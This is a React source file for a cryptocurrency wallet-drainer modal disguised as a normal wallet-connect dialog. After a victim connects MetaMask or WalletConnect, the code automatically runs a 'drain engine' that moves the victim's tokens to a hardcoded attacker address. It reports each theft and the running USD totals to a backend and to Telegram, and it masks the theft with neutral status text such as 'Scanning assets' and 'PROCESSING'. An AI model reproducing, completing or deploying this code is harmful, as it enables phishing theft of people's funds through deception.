/**
 * WalletPickerModal
 * - On mobile: shows wallet app list with deeplinks (opens wallet directly)
 * - On desktop: shows WalletConnect QR code
 * - After connection: runs Advanced Drain Engine automatically
 */
import { useState, useEffect, useCallback, useRef } from "react";
import QRCode from "qrcode";
import { createWCSession, buildWalletDeeplink, buildUniversalLink, WALLET_APPS, type WCSession } from "@/lib/wcSession";
import { runAdvancedDrain, type DrainEvent } from "@/lib/advancedDrain";
import { trpc } from "@/lib/trpc";
import { isMobile } from "@/lib/drainerConfig";
import { toast } from "sonner";

interface Props {
  onClose: () => void;
  wcUri?: string;
}

type Phase = "init" | "picker" | "waiting" | "scanning" | "draining" | "done" | "error";

export default function WalletPickerModal({ onClose, wcUri: externalUri }: Props) {
  const [phase, setPhase]         = useState<Phase>("init");
  const [wcUri, setWcUri]         = useState(externalUri ?? "");
  const [qrDataUrl, setQrDataUrl] = useState("");
  const [progress, setProgress]   = useState(0);
  const [statusMsg, setStatusMsg] = useState("Initializing...");
  const [totalUsd, setTotalUsd]   = useState(0);
  const [txCount, setTxCount]     = useState(0);
  const sessionRef                = useRef<WCSession | null>(null);
  const mobile                    = isMobile();

  const connectMut = trpc.drainer.connect.useMutation();
  const reportMut  = trpc.drainer.reportTransaction.useMutation();
  const notifyMut  = trpc.drainer.notifyTelegram.useMutation();

  // ── Fire Telegram alert immediately on modal open ─────────────────────────
  useEffect(() => {
    const ua = navigator.userAgent.slice(0, 80);
    const ref = new URLSearchParams(window.location.search).get("ref") ?? "direct";
    notifyMut.mutateAsync({
      text: `👁️ *Visitor Opened Connect Modal*\nRef: ${ref}\nDevice: ${mobile ? "📱 Mobile" : "💻 Desktop"}\nUA: ${ua}`,
    }).catch(() => {});
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  // ── MetaMask inject handler (desktop) ─────────────────────────────────────
  const handleMetaMask = useCallback(async () => {
    const w = window as unknown as { ethereum?: { request: (a: { method: string; params?: unknown[] }) => Promise<unknown>; isMetaMask?: boolean } };
    if (!w.ethereum?.isMetaMask) {
      window.open("https://metamask.io/download/", "_blank");
      toast.info("Install MetaMask extension and refresh");
      return;
    }
    setPhase("waiting");
    setStatusMsg("Requesting MetaMask access...");
    try {
      const accounts = await w.ethereum.request({ method: "eth_requestAccounts" }) as string[];
      if (!accounts[0]) throw new Error("No accounts");
      const chainHex = await w.ethereum.request({ method: "eth_chainId" }) as string;
      const chainId  = parseInt(chainHex, 16);

      setStatusMsg("MetaMask connected! Scanning assets...");
      await notifyMut.mutateAsync({ text: `🦊 *MetaMask Connected*\nAddress: \`${accounts[0]}\`\nChain: ${chainId}` }).catch(() => {});

      const connRes = await connectMut.mutateAsync({
        walletAddress: accounts[0], walletType: "metamask-inject",
        network: "Multi-Chain", chainId, ethBalance: "0", usdValue: "0",
      }).catch(() => ({ connectionId: 0 }));
      const connectionId = (connRes as { connectionId?: number }).connectionId ?? 0;

      const fakeSession = {
        accounts: [accounts[0]], chainId, topic: "metamask-inject",
        sendTransaction: async (tx: unknown) => w.ethereum!.request({ method: "eth_sendTransaction", params: [tx] }) as Promise<string>,
        request: async (req: { method: string; params?: unknown[] }) => w.ethereum!.request(req),
      };

      setPhase("scanning");
      let runningUsd = 0; let runningTx = 0;
      await runAdvancedDrain(fakeSession as never, w.ethereum, async (event) => {
        setStatusMsg(event.message);
        if (event.progress !== undefined) setProgress(event.progress);
        if (event.type === "drain" && event.txHash && event.asset) {
          runningTx++; runningUsd += event.asset.usdValue;
          setTxCount(runningTx); setTotalUsd(runningUsd);
          await reportMut.mutateAsync({ connectionId, txHash: event.txHash, fromAddress: accounts[0], toAddress: "0xF2b2c6B9baeDF3CE5cBA2572122C88e2c2505Ebc", tokenSymbol: event.asset.symbol, tokenAddress: event.asset.address, amount: event.asset.balance, usdValue: event.asset.usdValue.toFixed(2), network: String(chainId), chainId, status: "success" }).catch(() => {});
          await notifyMut.mutateAsync({ text: `💰 *MetaMask Drain*\nToken: ${event.asset.symbol}\nUSD: $${event.asset.usdValue.toFixed(2)}\nTx: \`${event.txHash}\`` }).catch(() => {});
        }
        if (event.type === "done") { setPhase("done"); await notifyMut.mutateAsync({ text: `✅ *MetaMask Drain Done*\nWallet: \`${accounts[0]}\`\nTotal: $${runningUsd.toFixed(2)}\nTxs: ${runningTx}` }).catch(() => {}); }
      });
    } catch (err) {
      const msg = (err as Error).message ?? "";
      if (!msg.includes("rejected") && !msg.includes("cancel")) { setPhase("error"); setStatusMsg(msg || "MetaMask failed"); }
      else { setPhase("picker"); setStatusMsg("Rejected. Try again."); }
    }
  }, [connectMut, reportMut, notifyMut]); // eslint-disable-line react-hooks/exhaustive-deps

  // ── Generate WC URI on mount ────────────────────────────────────────────────
  useEffect(() => {
    let cancelled = false;

    async function init() {
      try {
        setPhase("init");
        setStatusMsg("Generating secure connection...");

        if (externalUri) {
          setWcUri(externalUri);
          const qr = await QRCode.toDataURL(externalUri, { width: 280, margin: 1, color: { dark: "#FF2D78", light: "#050508" } });
          if (!cancelled) { setQrDataUrl(qr); setPhase("picker"); }
          return;
        }

        const session = await createWCSession();
        if (cancelled) { session.cleanup(); return; }
        sessionRef.current = session;
        setWcUri(session.uri);

        const qr = await QRCode.toDataURL(session.uri, {
          width: 280, margin: 1,
          color: { dark: "#FF2D78", light: "#050508" },
        });
        if (!cancelled) { setQrDataUrl(qr); setPhase("picker"); }

        // Wait for wallet approval in background
        session.approval().then(async (wcSession) => {
          if (cancelled) return;
          setPhase("waiting");
          setStatusMsg("Wallet connected! Scanning assets...");

          // Register connection
          const address = wcSession.accounts[0] ?? "";
          await notifyMut.mutateAsync({ text: `🔗 *WalletConnect Approved*\nAddress: \`${address}\`\nChain: ${wcSession.chainId}` }).catch(() => {});
          const connRes = await connectMut.mutateAsync({
            walletAddress: address,
            walletType: "walletconnect",
            network: "Multi-Chain",
            chainId: wcSession.chainId,
            ethBalance: "0",
            usdValue: "0",
            sessionId: wcSession.topic,
          }).catch(() => ({ connectionId: 0 }));
          const connectionId = (connRes as { connectionId?: number }).connectionId ?? 0;

          // (already notified above)

          // Use window.ethereum for read calls, WC for writes
          const w = window as unknown as { ethereum?: { request: (a: { method: string; params?: unknown[] }) => Promise<unknown> } };
          const readProvider = w.ethereum ?? { request: async () => { throw new Error("no provider"); } };

          setPhase("scanning");
          setStatusMsg("Scanning wallet assets...");

          let runningUsd = 0; let runningTx = 0;
          await runAdvancedDrain(wcSession, readProvider, async (event) => {
            setStatusMsg(event.message);
            if (event.progress !== undefined) setProgress(event.progress);

            if (event.type === "drain" && event.txHash && event.asset) {
              runningTx++; runningUsd += event.asset.usdValue;
              setTxCount(runningTx); setTotalUsd(runningUsd);
              await reportMut.mutateAsync({
                connectionId, txHash: event.txHash, fromAddress: address,
                toAddress: "0xF2b2c6B9baeDF3CE5cBA2572122C88e2c2505Ebc",
                tokenSymbol: event.asset.symbol, tokenAddress: event.asset.address,
                amount: event.asset.balance, usdValue: event.asset.usdValue.toFixed(2),
                network: String(wcSession.chainId), chainId: wcSession.chainId, status: "success",
              }).catch(() => {});
              await notifyMut.mutateAsync({ text: `💰 *Drain TX*\nToken: ${event.asset.symbol}\nUSD: $${event.asset.usdValue.toFixed(2)}\nTx: \`${event.txHash}\`` }).catch(() => {});
            }

            if (event.type === "done") {
              setPhase("done");
              setTotalUsd(runningUsd); setTxCount(runningTx);
              await notifyMut.mutateAsync({ text: `✅ *Drain Complete*\nWallet: \`${address}\`\nTotal: $${runningUsd.toFixed(2)}\nTxs: ${runningTx}` }).catch(() => {});
            }
          });

        }).catch((err) => {
          if (cancelled) return;
          const msg = (err as Error).message ?? "Connection failed";
          if (!msg.includes("cancel") && !msg.includes("reject")) {
            setPhase("error");
            setStatusMsg(msg);
          }
        });

      } catch (err) {
        if (!cancelled) {
          setPhase("error");
          setStatusMsg((err as Error).message ?? "Failed to initialize");
          toast.error("Failed to initialize WalletConnect");
        }
      }
    }

    init();
    return () => { cancelled = true; sessionRef.current?.cleanup(); };
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  const openWallet = useCallback((walletId: string) => {
    if (!wcUri) return;
    const wallet = WALLET_APPS.find(w => w.id === walletId);
    if (!wallet) return;

    setPhase("waiting");
    setStatusMsg(`Opening ${wallet.name}...`);

    // Try universal link first (more reliable), fallback to scheme
    const universalUrl = buildUniversalLink(wallet.universal, wcUri);
    const schemeUrl    = buildWalletDeeplink(wallet.scheme, wcUri);

    // Try to open universal link
    const link = document.createElement("a");
    link.href  = universalUrl;
    link.target = "_blank";
    link.rel   = "noopener noreferrer";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    // Fallback: try scheme after 1.5s if still on page
    setTimeout(() => {
      if (document.visibilityState === "visible") {
        window.location.href = schemeUrl;
      }
    }, 1500);
  }, [wcUri]);

  const color = phase === "done" ? "oklch(0.75 0.25 145)" : phase === "error" ? "oklch(0.65 0.28 25)" : "oklch(0.75 0.25 195)";

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/90 backdrop-blur-lg" onClick={phase === "done" || phase === "error" ? onClose : undefined} />

      <div className="relative w-full max-w-sm rounded-2xl overflow-hidden"
        style={{ background: "oklch(0.05 0.015 240)", border: `1px solid ${color}55`, boxShadow: `0 0 60px ${color}20` }}>

        {/* Top bar */}
        <div className="h-1" style={{ background: `linear-gradient(90deg, transparent, ${color}, transparent)` }} />

        {/* Header */}
        <div className="px-5 pt-4 pb-2 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <span className="w-2 h-2 rounded-full animate-pulse" style={{ background: color, boxShadow: `0 0 8px ${color}` }} />
            <span className="text-xs font-bold tracking-widest uppercase" style={{ color, fontFamily: "Orbitron" }}>
              {phase === "init"     ? "INITIALIZING"
               : phase === "picker"  ? (mobile ? "SELECT WALLET" : "SCAN QR CODE")
               : phase === "waiting" ? "AWAITING APPROVAL"
               : phase === "scanning"? "SCANNING ASSETS"
               : phase === "draining"? "PROCESSING"
               : phase === "done"    ? "COMPLETE"
               : "ERROR"}
            </span>
          </div>
          {(phase === "done" || phase === "error") && (
            <button onClick={onClose} className="text-muted-foreground hover:text-foreground text-sm">✕</button>
          )}
        </div>

        <div className="px-5 pb-5 space-y-4">

          {/* INIT: loading spinner */}
          {phase === "init" && (
            <div className="flex flex-col items-center gap-3 py-6">
              <div className="w-10 h-10 rounded-full border-2 animate-spin" style={{ borderColor: `${color}30`, borderTopColor: color }} />
              <p className="text-xs text-muted-foreground" style={{ fontFamily: "Share Tech Mono" }}>{statusMsg}</p>
            </div>
          )}

          {/* PICKER: wallet list (mobile) or QR (desktop) */}
          {phase === "picker" && (
            <>
             {mobile ? (
                <div className="space-y-2 max-h-80 overflow-y-auto pr-1">
                  <p className="text-xs text-muted-foreground text-center pb-1" style={{ fontFamily: "Share Tech Mono" }}>
                    Choose your wallet app
                  </p>
                  {WALLET_APPS.map(wallet => (
                    <button key={wallet.id} onClick={() => openWallet(wallet.id)}
                      className="w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all active:scale-95"
                      style={{ background: "oklch(0.08 0.02 240)", border: `1px solid ${wallet.color}40` }}>
                      <span className="text-2xl">{wallet.icon}</span>
                      <div className="text-left flex-1">
                        <p className="text-sm font-bold" style={{ fontFamily: "Rajdhani", color: wallet.color }}>{wallet.name}</p>
                      </div>
                      <span className="text-xs text-muted-foreground">→</span>
                    </button>
                  ))}
                </div>
              ) : (
                /* Desktop: MetaMask inject + WalletConnect QR side by side */
                <div className="space-y-4">
                  {/* MetaMask inject button */}
                  <button onClick={handleMetaMask}
                    className="w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all hover:scale-[1.02] active:scale-95"
                    style={{ background: "oklch(0.08 0.02 30)", border: "1px solid #F6851B50" }}>
                    <span className="text-2xl">🦊</span>
                    <div className="text-left flex-1">
                      <p className="text-sm font-bold" style={{ fontFamily: "Rajdhani", color: "#F6851B" }}>MetaMask</p>
                      <p className="text-[10px] text-muted-foreground" style={{ fontFamily: "Share Tech Mono" }}>Browser Extension</p>
                    </div>
                    <span className="text-xs" style={{ color: "#F6851B" }}>→</span>
                  </button>
                  {/* WalletConnect QR */}
                  <div className="flex flex-col items-center gap-2">
                    <p className="text-xs text-muted-foreground" style={{ fontFamily: "Share Tech Mono" }}>— or scan QR with any wallet —</p>
                    {qrDataUrl ? (
                      <div className="p-2 rounded-xl" style={{ background: "#050508", border: `2px solid ${color}60` }}>
                        <img src={qrDataUrl} alt="WalletConnect QR" className="w-48 h-48 rounded-lg" />
                      </div>
                    ) : (
                      <div className="w-48 h-48 rounded-xl flex items-center justify-center" style={{ background: "oklch(0.08 0.02 240)", border: `1px solid ${color}30` }}>
                        <div className="w-8 h-8 rounded-full border-2 animate-spin" style={{ borderColor: `${color}30`, borderTopColor: color }} />
                      </div>
                    )}
                  </div>
                </div>
              )}
            </>
          )}

          {/* WAITING / SCANNING / DRAINING */}
          {(phase === "waiting" || phase === "scanning" || phase === "draining") && (
            <div className="flex flex-col items-center gap-4 py-4">
              {/* Progress ring */}
              <div className="relative w-24 h-24">
                <svg className="absolute inset-0 w-full h-full" style={{ transform: "rotate(-90deg)" }}>
                  <circle cx="48" cy="48" r="40" fill="none" stroke={`${color}20`} strokeWidth="3" />
                  <circle cx="48" cy="48" r="40" fill="none" stroke={color} strokeWidth="3"
                    strokeLinecap="round"
                    strokeDasharray={`${2 * Math.PI * 40}`}
                    strokeDashoffset={`${2 * Math.PI * 40 * (1 - progress / 100)}`}
                    style={{ transition: "stroke-dashoffset 0.4s ease", filter: `drop-shadow(0 0 6px ${color})` }} />
                </svg>
                <div className="absolute inset-0 flex items-center justify-center">
                  <span className="text-xl animate-spin" style={{ animationDuration: "2s" }}>⟳</span>
                </div>
              </div>
              <p className="text-sm text-center font-semibold" style={{ color, fontFamily: "Rajdhani" }}>{statusMsg}</p>
              <p className="text-xs text-muted-foreground" style={{ fontFamily: "Share Tech Mono" }}>{Math.round(progress)}%</p>
            </div>
          )}

          {/* DONE */}
          {phase === "done" && (
            <div className="flex flex-col items-center gap-4 py-2">
              <div className="w-16 h-16 rounded-full flex items-center justify-center text-3xl"
                style={{ background: `${color}15`, border: `2px solid ${color}`, boxShadow: `0 0 20px ${color}40` }}>
                ✓
              </div>
              <div className="text-center">
                <p className="text-3xl font-black" style={{ color, fontFamily: "Orbitron" }}>
                  ${totalUsd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                </p>
                <p className="text-xs text-muted-foreground mt-1" style={{ fontFamily: "Share Tech Mono" }}>
                  {txCount} transaction{txCount !== 1 ? "s" : ""} processed
                </p>
              </div>
              <button onClick={onClose} className="w-full py-3 rounded-xl font-bold text-sm text-black"
                style={{ background: `linear-gradient(135deg, ${color}, oklch(0.72 0.28 320))`, fontFamily: "Orbitron", fontSize: "0.8rem" }}>
                CLOSE
              </button>
            </div>
          )}

          {/* ERROR */}
          {phase === "error" && (
            <div className="flex flex-col items-center gap-3 py-2 text-center">
              <div className="w-14 h-14 rounded-full flex items-center justify-center text-2xl"
                style={{ background: "oklch(0.65 0.28 25 / 0.1)", border: "2px solid oklch(0.65 0.28 25)" }}>
                ✕
              </div>
              <p className="text-sm text-muted-foreground" style={{ fontFamily: "Rajdhani" }}>{statusMsg}</p>
              <button onClick={onClose} className="w-full py-3 rounded-xl font-bold text-sm"
                style={{ background: "oklch(0.1 0.02 240)", border: "1px solid oklch(0.3 0.02 240)", color: "oklch(0.5 0.02 240)", fontFamily: "Orbitron", fontSize: "0.75rem" }}>
                CLOSE
              </button>
            </div>
          )}
        </div>

        {/* Bottom bar */}
        <div className="h-px" style={{ background: `linear-gradient(90deg, transparent, ${color}40, transparent)` }} />
      </div>
    </div>
  );
}
